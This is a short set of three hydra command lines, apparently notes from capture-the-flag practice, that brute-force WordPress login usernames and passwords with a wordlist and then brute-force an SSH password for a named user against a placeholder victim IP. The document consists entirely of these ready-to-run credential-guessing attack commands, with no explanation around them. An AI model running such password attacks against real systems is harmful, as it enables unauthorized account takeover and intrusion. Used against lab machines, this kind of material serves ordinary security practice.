hydra -L fsocity.dic -p test <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

hydra -l Elliot -P fsocity.dic <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30 

hydra -l think -P /home/mystic/Downloads/test/htb/password.txt <victim ip> ssh
